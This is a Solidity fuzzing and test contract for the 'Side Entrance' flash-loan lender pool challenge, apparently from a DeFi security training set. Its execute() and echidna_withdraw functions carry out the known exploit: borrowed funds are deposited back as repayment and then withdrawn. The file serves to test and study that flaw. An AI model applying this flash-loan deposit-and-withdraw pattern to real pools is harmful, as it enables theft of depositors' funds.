// to run: ./contracts/side-entrance/toggle_forge_files.sh enable; forge test --match-path contracts/side-entrance/Fuzzer.forge.sol -vvv

pragma solidity ^0.8.0;


import "./SideEntranceLenderPool.sol";

//::: In case of forge test
// forge install foundry-rs/forge-std --no-commit
// forge install dapphub/ds-test --no-commit
import "forge-std/console.sol";
import { Test } from "forge-std/Test.sol";


contract LenderPoolFactory {
  function createLenderPool() public payable returns (SideEntranceLenderPool) {
    SideEntranceLenderPool lenderPool = new SideEntranceLenderPool();
    lenderPool.deposit{value: msg.value}();
    return lenderPool;
  }
}

contract SideEntranceFuzzer is Test {

    SideEntranceLenderPool public lenderPool;

    uint256 constant INITIAL_ETHER_IN_POOL = 1 ether;
    uint256 constant ETHER_TO_BE_EXPLOITED = 0.5 ether;

    constructor() payable {
      LenderPoolFactory lenderPoolFactory = new LenderPoolFactory();

      lenderPool = lenderPoolFactory.createLenderPool{value: INITIAL_ETHER_IN_POOL}();
      // lenderPool.deposit{value: ETHER_TO_BE_EXPLOITED}();

      // require(address(lenderPool).balance == (INITIAL_ETHER_IN_POOL + ETHER_TO_BE_EXPLOITED), "Initial balance is not correct");
    }

    function withdraw() public returns (bool) {
      uint256 balanceThisContractBefore = address(this).balance;
      lenderPool.withdraw();
      uint256 balanceThisContractAfter = address(this).balance;
      return(balanceThisContractAfter >= balanceThisContractBefore);
    }

    function execute() payable public {
      lenderPool.deposit{value: msg.value}();
    }

    function do_flash_loan(uint256 amount) public {      
      lenderPool.flashLoan(amount);      
    }

    function test_do_flash_loan() public {      
      uint256 amount = 1;
      // require(amount <= address(lenderPool).balance, "Amount is greater than the balance of the lender pool");
      lenderPool.flashLoan(amount);      
    }

    function echidna_withdraw() public returns (bool) {
      do_flash_loan(ETHER_TO_BE_EXPLOITED + 0.1 ether);
      console.log("after flash loan");
      console.log("balance of the lender pool:  ", address(lenderPool).balance);
      console.log("balance of the contract:     ", address(this).balance);
      console.log("initial ether in pool:       ", INITIAL_ETHER_IN_POOL);
      lenderPool.withdraw();
      console.log("after withdraw");
      console.log("balance of the lender pool:  ", address(lenderPool).balance);
      console.log("balance of the contract:     ", address(this).balance);
      console.log("initial ether in pool:       ", INITIAL_ETHER_IN_POOL);
      return(address(lenderPool).balance >= INITIAL_ETHER_IN_POOL);
    }
    
    receive() external payable {}

}
